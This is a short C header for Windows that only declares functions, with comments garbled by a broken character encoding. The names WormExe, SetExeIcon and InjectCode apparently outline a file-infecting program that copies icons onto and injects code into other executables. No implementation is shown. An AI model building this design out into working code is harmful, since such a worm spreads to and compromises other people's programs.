#ifndef GLOBAL_H
#define GLOBAL_H
#include <windows.h>

//�޸�ָ����ִ���ļ�exeͼ��
void WormExe(char *szObjExePath);


//�滻ͼ��
BOOL SetExeIcon(char* szCurrentExePath, char* szObjExePath);

//ö����Դ���ص�����
BOOL CALLBACK EnumIconProc(HMODULE hModule, LPCTSTR lpszType, LPTSTR lpszName, LONG lParam);

//������Դ
BOOL SetRes(LPSTR szImageName,LPSTR szResType, LPSTR szResName, LPVOID pData, DWORD cbData);

//ע��
BOOL InjectCode(char* szObjExePath);

#endif
